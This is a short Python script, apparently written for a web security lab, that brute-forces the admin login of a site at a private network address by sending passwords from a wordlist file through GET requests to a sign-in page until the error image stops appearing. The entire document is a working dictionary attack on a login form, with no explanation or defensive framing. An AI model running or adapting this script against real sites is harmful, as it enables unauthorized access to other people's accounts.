import requests

URL = 'http://192.168.1.13'

with open('dict') as f:
    content = f.readlines()
content = [x.strip() for x in content] 

for i, mdp in enumerate(content):

    r = requests.get(URL+'?page=signin&username=admin&password=%s&Login=Login#' % mdp)
    if "images/WrongAnswer.gif" in r.text:
        print('%d - %s -> Wrong password' % (i, mdp))
    else:
        print('%d - %s -> Good password' % (i, mdp))
        break
    
